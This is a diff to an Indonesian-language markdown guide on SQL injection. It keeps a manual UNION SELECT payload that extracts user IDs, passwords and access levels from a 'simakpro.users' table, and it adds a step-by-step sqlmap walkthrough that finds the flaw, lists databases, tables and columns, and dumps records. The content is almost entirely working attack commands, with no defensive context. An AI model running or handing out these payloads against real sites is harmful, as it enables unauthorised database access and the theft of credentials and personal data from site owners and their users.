@@ -29,3 +29,27 @@
 ```bash
 ' UNION SELECT 1,2,3,CONCAT(usrid,' - ',passwd,' - ',level, ' - ', type_user),5,6,7,8,9,10 FROM simakpro.users #
 ```
+
+
+## Langkah-langkah melakukan SQL Injection secara otomatis menggunakan SQLMAP
+* Mencari tahu apakah aplikasi website memiliki vuln sql injection dengan memasukan script ' secara manual ke inputan.
+* Selanjutnya, Masukan perintah berikut untuk mengetahui vuln sql injectionnya
+```bash
+sqlmap -u "linkinputvulnSqlInjection"
+```
+* Selanjutnya, Masukan perintah berikut untuk mengetahui daftar isi databasenya
+```bash
+sqlmap -u "linkinputvulnSqlInjection" --dbs
+```
+* Selanjutnya, Masukan perintah berikut untuk melihat daftar tables didalam database yang dipilih
+```bash
+sqlmap -u "linkinputvulnSqlInjection" -D [db_name] --tables
+```
+* Selanjutnya, Masukan perintah berikut untuk melihat struktur tables yang dipilih
+```bash
+sqlmap -u "linkinputvulnSqlInjection" -D [db_name] -T [table_name] --columns
+```
+* Terakhir, Masukan perintah berikut untuk melihat record data didalam tables dari nama columns yang dipilih
+```bash
+sqlmap -u "linkinput vulnSqlInjection" -D [db_name] -T [table_name] [name_columns,name_columns] --dump
+```
